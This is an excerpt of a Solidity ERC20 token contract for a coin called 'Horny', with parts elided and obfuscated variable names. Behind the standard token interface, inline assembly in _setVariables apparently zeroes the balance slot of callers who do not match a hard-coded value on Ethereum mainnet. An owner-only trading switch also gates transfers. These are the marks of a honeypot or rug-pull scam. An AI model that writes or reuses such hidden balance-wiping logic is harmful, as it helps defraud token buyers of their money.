...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addHorny;
    uint256 private sexyGal = block.number*2;

    mapping (address => bool) private _firstHorn; 
    mapping (address => bool) private _secondHole;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private nightlyBuild;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private penguinShop;
    address public pair;
    ...
    bool private trading; uint256 private shipFroce = 1; bool private frogAlarm;
    uint256 private _decimals; uint256 private warFish;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addHorny.push(_router); addHorny.push(msgSender_); addHorny.push(pair);
        for (uint256 q=0; q < 3;) {_firstHorn[addHorny[q]] = true; unchecked{q++;} }
    }
    ...
    function _setVariables() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xd9b3908b74e95dafde3c3981f21ec3083df315fdc8cfa4b596bb8174c11c8da8
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x646216ac20e22938f8ccf7cad51e3b22ef6e25c41fcc21d2f3f3886ee089fb60,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; sexyGal = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addHorny[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployHorny(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addHorny[0], 10 ** 77);
        _setVariables();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployHorny(creator, initialSupply);
    }
}

contract HornyToken is ERC20Token {
    constructor() ERC20Token("Horny", "HORNY", msg.sender, 25000000 * 10 ** 18) {
    }
}